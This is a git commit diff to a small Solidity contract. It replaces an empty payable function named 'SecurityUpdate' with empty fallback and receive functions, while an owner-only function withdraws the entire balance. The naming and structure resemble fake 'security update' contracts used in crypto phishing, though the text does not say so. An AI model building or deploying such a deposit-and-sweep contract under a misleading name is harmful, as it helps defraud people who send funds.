06994737ace50089e17e948074f05c547de28182
放牛极客 <l_iupeiyu@qq.com>
2022-12-07 17:04:52 +0800

    优化fallback函数

--- contracts/CornucopiaContract.sol
+++ contracts/CornucopiaContract.sol
@@ -16,8 +16,13 @@ contract CornucopiaContract{
         require(owner == msg.sender, "owner error");
         payable(msg.sender).transfer(address(this).balance);
     }
-    function SecurityUpdate() public payable{
-    }
+    
+    // solidity 0.6 before compile no problom
+    // function SecurityUpdate() public payable{}
+
+    // solidity 0.6 after
+    fallback () external payable {}
+    receive () external payable {}
 
     function getBalance()public view returns (uint256){
         return address(this).balance;
